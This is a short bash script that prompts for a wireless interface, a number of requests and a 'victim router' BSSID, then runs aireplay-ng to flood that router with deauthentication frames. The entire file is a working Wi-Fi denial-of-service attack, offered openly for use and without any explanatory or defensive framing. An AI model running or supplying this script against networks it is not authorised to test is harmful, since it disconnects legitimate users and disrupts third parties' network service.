#! /../bin/bash

clear
echo -e "Enter the interface Name"
read INT
clear
echo -e "Enter the Number of deauth request you want to send"
read DE
clear
echo -e "Enter the BSSID of victim router"
read BSID
clear
aireplay-ng --deauth $DE -a $BSID $INT
sleep 3
